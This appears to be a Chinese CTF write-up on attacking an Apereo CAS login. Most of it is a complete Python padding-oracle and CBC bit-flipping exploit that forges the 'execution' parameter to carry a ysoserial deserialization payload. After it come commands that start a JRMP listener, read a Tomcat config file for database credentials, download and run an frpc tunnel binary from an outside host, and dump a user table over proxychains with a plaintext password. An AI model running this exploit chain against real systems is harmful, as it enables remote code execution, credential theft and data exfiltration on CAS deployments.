第一步padding oracle

```python
from jose import jws
from Crypto.Cipher import AES
from cStringIO import StringIO
from multiprocessing.pool import ThreadPool
import time
import requests
import base64
import zlib
import uuid
import binascii
import json
import subprocess
import requests
import re

start_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

iv = uuid.uuid4().bytes
header_mode = '\x00\x00\x00\x22\x00\x00\x00\x10{iv}\x00\x00\x00\x06aes128'

JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-all.jar'
URL= "http://ip:port/login"


headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}

cookies = {"JSESSIONID":"ADF6653ED3808BE63B052BCED53494A3"}

def base64Padding(data):
	missing_padding = 4 - len(data) % 4
	if missing_padding and missing_padding != 4:
		data += '=' * missing_padding
	return data

def compress(data):
	gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
	data = gzip_compress.compress(data) + gzip_compress.flush()
	return data

def bitFlippingAttack(fake_value, orgin_value):
	iv = []
	for f, o in zip(fake_value, orgin_value):
		iv.append(chr(ord(f) ^ ord(o)))
	return iv

def pad_string(payload):
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	return pad(payload)

def send_request(paramsPost,w):
	response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=False)
	return w, response

def paddingOracle(value):
	fakeiv = list(chr(0)*16)
	intermediary_value_reverse = []
	for i in range(0, 16):
		num = 16
		response_result = []

		for j in range(0, 256-num+1, num):
			jobs = []
			pool = ThreadPool(num)
			for w in range(j, j + num):
				fakeiv[N-1-i] = chr(w)
				#print(fakeiv)
				fake_iv = ''.join(fakeiv)
				paramsPost = {"execution":"4a538b9e-ecfe-4c95-bcc0-448d0d93f494_" + base64.b64encode(header + body + fake_iv + value),"password":"admin","submit":"LOGIN","_eventId":"submit","lt":"LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org","username":"admin"}
				job = pool.apply_async(send_request, (paramsPost,w))
				jobs.append(job)

			pool.close()
			pool.join()

			for w in jobs:
				j_value, response = w.get()
				#print(response)
				if response.status_code == 200:
					print("="*5 + "200" + "="*5)
					response_result.append(j_value)
		print(response_result)

		if len(response_result) == 1:
			j_value  = response_result[0]
			intermediary_value_reverse.append(chr((i+1) ^ j_value))
			for w in range(0, i+1):
				try:
					fakeiv[N-w-1] = chr(ord(intermediary_value_reverse[w]) ^ (i+2))
				except Exception as e:
					print(fakeiv, intermediary_value_reverse, w, i+1)
					print(base64.b64encode(value))
					print(e)
					exit()
			print(fakeiv)
		else:
			print(response_result)
			print("Exit Because count of is " + str(len(response_result)))
			exit()
		print("="*5 + "sleep" + "="*5)
		time.sleep(1)

	intermediary_value = intermediary_value_reverse[::-1]
	return intermediary_value

def pad_string(payload):
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	return pad(payload)

if __name__ == '__main__':
	popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'JRMPClient2', 'your_ip:your_port'],stdout=subprocess.PIPE)
	payload = popen.stdout.read()
	payload = pad_string(compress(payload))

	excution = "input_excution"

	body = base64.b64decode(excution)[34:]
	header = base64.b64decode(excution)[0:34]
	iv = list(header[8:24])

	N=16

	fake_value_arr = re.findall(r'[\s\S]{16}', payload)
	fake_value_arr.reverse()

	value = body[-16:]

	payload_value_arr = [value]
	
	count = 1
	all_count = len(fake_value_arr)
	print(all_count)
	for i in fake_value_arr:
		intermediary_value = paddingOracle(value)
		print(value, intermediary_value)
		fakeIv = bitFlippingAttack(intermediary_value, i)
		value = ''.join(fakeIv)
		payload_value_arr.append(value)

		print(count, all_count)
		count += 1


	fakeiv = payload_value_arr.pop()
	payload_value_arr.reverse()

	payload = header_mode.format(iv=fakeiv) + ''.join(payload_value_arr)
	print(base64.b64encode(payload))

	end_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
	print(start_time,end_time)
	f = open('/tmp/cas.txt', 'w')
	f.write(base64.b64encode(payload))
	f.close()
```

跑出jrmp，然后fuzz gadget可以发现JDK7u21，可以打。
```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8899 Jdk7u21 'cmd'
```

查询连接字符串
```
cat /usr/local/apache-tomcat-7.0.104/webapps/ROOT/WEB-INF/deployerConfigContext.xml
```

做代理
```
curl http://ip:8000/frpc -o /tmp/frpc
curl http://ip:8000/frpc.ini -o /tmp/frpc.ini
chmod +x frpc
./frpc -c frpc.ini
```

```
proxychains mysql -h 172.19.0.3 -u cas -p8trR3Qxp -e 'select * from cas.sso_t_user'
```

登陆即可看到flag